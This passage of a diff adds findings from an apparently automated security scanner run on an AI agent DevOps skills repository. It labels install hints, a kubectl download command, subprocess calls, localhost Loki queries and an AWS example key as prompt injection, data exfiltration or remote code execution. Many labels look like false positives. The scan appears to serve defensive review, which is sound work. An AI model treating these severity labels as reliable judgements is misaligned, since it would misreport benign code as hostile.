+  "pattern": "Instruction Replay Request",
+  "severity": "Severity.HIGH",
+  "line": 50,
+  "ctx": "echo \"Installation instructions:\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 57,
+  "ctx": "...             echo \"  macOS:   brew install yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 58,
+  "ctx": "...             echo \"  Linux:   pip install yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 64,
+  "ctx": "...             echo \"  macOS:   brew install kubeconform\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 71,
+  "ctx": "...             echo \"  macOS:   brew install kubectl\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Remote Code Execution",
+  "severity": "Severity.CRITICAL",
+  "line": 73,
+  "ctx": "...LO https://dl.k8s.io/release/\\$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/\\$(uname -s | tr '[:upper:]' '[:lower:]')/\\$(uname -m)/kubectl\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/test_count_yaml_documents.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 102,
+  "ctx": "result = subprocess.run(command, capture_output=True, ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 214,
+  "ctx": "- `-ignore-missing-schemas`: Skip validation for CRDs without available sch..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/test/schema-errors-test.yaml",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...idator skill - schema validation errors # Purpose: Exercise kubeconform schema type-mismatch detection on syntactically # valid YAML. The comprehensive-test."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/references/best_practices.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 338,
+  "ctx": "curl -G \"http://localhost:3100/loki/api/v1/query_range\"..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/SKILL.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 195,
+  "ctx": "... | logfmt | remote_addr = ip(\"192.168.4.0/24\")"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 36,
+  "ctx": "subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python Socket Connection",
+  "severity": "Severity.MEDIUM",
+  "line": 48,
+  "ctx": "with socket.socket(socket.AF_INET, socket.SOCK_ST..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 56,
+  "ctx": "subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 87,
+  "ctx": "subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 124,
+  "ctx": "...              with request.urlopen(ready_url, timeout=4) as response:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 125,
+  "ctx": "...       body = response.read().decode(\"utf-8\", errors=\"ignore\").lower()"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 172,
+  "ctx": "with request.urlopen(req, timeout=10) as response:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 181,
+  "ctx": "with request.urlopen(req, timeout=10) as response:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 182,
+  "ctx": "... = json.loads(response.read().decode(\"utf-8\"))"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_loki_runtime_integration.py",
+  "category": "Prompt Injection",
+  "pattern": "Encoded Bypass (Base64 hint)",
+  "severity": "Severity.HIGH",
+  "line": 184,
+  "ctx": "body = exc.read().decode(\"utf-8\", errors=\"ignore\")"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/logql-generator/tests/test_skill_contract.py",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...-1 or end == -1: raise AssertionError( f\"Could not find section boundaries: {start_marker!r} -> {end_marker!r}\" ) return text[start:end] class TestVectorMatc"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/references/best_practices.md",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Header Injection",
+  "severity": "Severity.CRITICAL",
+  "line": 5,
+  "ctx": "> **Important Notice (Loki 3.4+):** Promtail has be..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/references/best_practices.md",
+  "category": "Mod Capability",
+  "pattern": "Hardcoded Secret",
+  "severity": "Severity.CRITICAL",
+  "line": 403,
+  "ctx": "access_key_id: AKIAIOSFODNN7EXAMPLE"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/references/loki_config_reference.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 23,
+  "ctx": "- [Memberlist Configuration](#memberlist-configuration)"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/references/loki_config_reference.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 901,
+  "ctx": "## Memberlist Configuration"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/scripts/test_generate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 504,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/scripts/test_generate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 570,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/scripts/test_generate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 583,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/loki-config-generator/scripts/test_generate_config.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 624,
+  "ctx": "result = subprocess.run("
+ }
+]
